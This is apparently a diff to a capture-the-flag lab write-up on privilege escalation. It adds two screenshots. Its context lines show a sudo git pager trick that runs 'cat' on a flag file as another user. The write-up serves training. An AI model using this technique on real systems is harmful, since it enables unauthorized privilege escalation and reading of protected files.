@@ -25,6 +25,8 @@ unzip privilege_escalation_1.zip
 # Extracting: username.txt
 ```
 
+![Unzip Output](/assets/ptgarage/privilege_escalation_lab1/img_2_1.png)
+
 We use these credentials to SSH into the target:
 
 ```bash
@@ -70,6 +72,8 @@ sudo -u ctf git config --global core.pager 'cat /home/ctf/flag'
 # Trigger the pager by listing the config with pagination forced
 sudo -u ctf git -p config --list
 ```
+
+![Flag Execution](/assets/ptgarage/privilege_escalation_lab1/img_4_1.png)
 
 This successfully triggers the payload and prints the flag:
 ```text
